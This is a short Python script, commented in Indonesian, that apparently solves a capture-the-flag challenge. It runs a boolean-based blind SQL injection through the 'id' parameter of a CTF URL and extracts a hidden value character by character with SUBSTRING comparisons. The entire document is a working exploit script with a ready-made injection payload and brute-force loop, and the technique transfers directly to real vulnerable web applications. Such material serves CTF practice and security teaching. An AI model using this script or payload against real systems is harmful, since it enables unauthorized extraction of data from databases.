import requests
import string

# Ganti dengan URL target kamu
url = "https://the-needle.chall.wwctf.com/"  # contoh: "http://localhost:8000/"

# Karakter yang akan dicoba (bisa disesuaikan kalau tahu format flag-nya)
charset = string.ascii_letters + string.digits + "{}_"

result = ""

for i in range(1, 100):  # Anggap panjang maksimum informasi adalah 100 karakter
    found = False
    for c in charset:
        payload = f"' OR SUBSTRING((SELECT information FROM info LIMIT 0,1),{i},1)='{c}' -- "
        params = {"id": payload}
        response = requests.get(url, params=params)

        if "Yes, We found it" in response.text:
            result += c
            print(f"[+] Found character {i}: {c}")
            found = True
            break

    if not found:
        print("[*] Extraction complete.")
        break

print("\n[FLAG]:", result)
